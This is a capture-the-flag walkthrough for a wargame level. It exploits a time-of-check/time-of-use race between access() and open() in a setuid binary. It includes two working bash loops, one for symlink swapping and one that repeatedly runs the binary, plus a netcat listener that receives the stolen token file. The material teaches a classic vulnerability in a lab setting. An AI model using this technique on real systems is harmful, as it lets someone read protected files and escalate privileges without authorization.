## Procedure:

1. **Examine your environment using Unix commands.**

   - `id` : Shows user and group identities that you have.
   - `pwd` : Displays the current directory you are in.
   - `ls -la` : Lists the files and their permissions in the current directory.

2. **After executing `ls -la`, you should notice two files: 'level10' executable and 'token'.**

   - The 'level10' file is an executable that checks if you have read rights on a file, then sends its contents to a server. 
   - The 'token' file holds the contents that you need access to.

3. **Analyze the details of the executable.**

   - Use the `strings level10` command to display readable sequences of characters in the executable. You will see that it uses 'access' then 'open'.
   - Understanding the `access` function is crucial. Refer to `man 2 access` function documentation to notice that using `access` to check if a user is authorized to open a file before actually doing so using `open` creates a security hole, due to the short time interval between checking and opening the file.

4. **Exploit the Time-of-Check Time-of-Use (TOCTTOU) loophole.**

   - Open three windows in your virtual machine.
   
   - In the first window, listen on the port 6969 with `netcat` using the command `nc -lk 6969`.

   - In the second window, you navigate to the `/tmp` directory and create a script (`symlink.sh`) that runs an infinite loop of creating and deleting a file, and creating a symbolic link to the `token` file.

        ```
        #!/bin/bash
        while true; do
            touch /tmp/link
            rm -f /tmp/link
            ln -s /home/user/level10/token /tmp/link
            rm -f /tmp/link
        done
        ```

   - In the third window, you create another infinite loop (`spam.sh`) that repeatedly triggers the `level10` executable on the `/tmp/link` file.

        ```
        #!/bin/bash
        while true; do
            /home/user/level10/level10 /tmp/link 127.0.0.1
        done
        ```

5. **Observe the exploit results.**

    - Pause both scripts (created in the second and third windows) after a few seconds and return to the first window, where you should see the contents of the `token` file printed.

## Final steps:

   - Use the retrieved token to log in as `flag10` user: `su flag10`.
   - Run `getflag` to get the password/token for the next level.

Remember, the aim of exploiting TOCTTOU is taking advantage of the delay between the time of check (when `access` is used) and the time of use (when `open` is used) to change the file that is accessed.